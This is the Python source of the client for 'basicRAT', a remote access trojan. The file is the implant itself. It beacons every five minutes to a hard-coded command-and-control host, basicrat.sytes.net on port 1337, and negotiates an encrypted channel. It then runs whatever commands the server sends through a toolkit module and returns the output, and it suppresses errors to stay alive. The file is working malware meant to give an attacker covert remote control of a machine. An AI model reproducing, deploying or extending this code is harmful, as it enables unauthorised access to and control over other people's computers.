#!/usr/bin/env python

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import sys
import time
import datetime

from core import *

#Use localhost when testing locally
#HOST = 'localhost'
HOST = 'basicrat.sytes.net'
PORT = 1337

# seconds to wait before client will attempt to reconnect
CONN_TIMEOUT = 30

# determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print 'This platform is not supported.'
    sys.exit(1)


def client_loop(conn, command_executor, dhkey):
    
    while True:
        results = ''

        # wait to receive data from server
        data = crypto.decrypt(conn.recv(4096), dhkey)

        # seperate data into command and action
        cmd, _, action = data.partition(' ')


        results = getattr(command_executor, cmd)(action)
        results = results.rstrip() + '\n{} completed.'.format(cmd)

        if cmd == 'kill':
            return 1

        if cmd == 'quit':
            return 0

        conn.send(crypto.encrypt(results, dhkey))


def isTimeToTryServerConnection():
    return datetime.datetime.now().minute % 5 == 0

def main():
    exit_status = 0

    while True:
        if isTimeToTryServerConnection():
            conn = socket.socket()
            command_executor = toolkit.Toolkit(PLAT, conn)

            try:
                conn.connect((HOST, PORT))

                # attempt to connect to basicRAT server
            except socket.error:
                time.sleep(CONN_TIMEOUT)
                continue

            dhkey = crypto.diffiehellman(conn)

            # This try/except statement makes the client very resilient, but it's
            # horrible for debugging. It will keep the client alive if the server
            # is torn down unexpectedly, or if the client freaks out.
            try:
                exit_status = client_loop(conn, command_executor, dhkey)
            except: pass

            if exit_status:
                sys.exit(0)


if __name__ == '__main__':
    main()
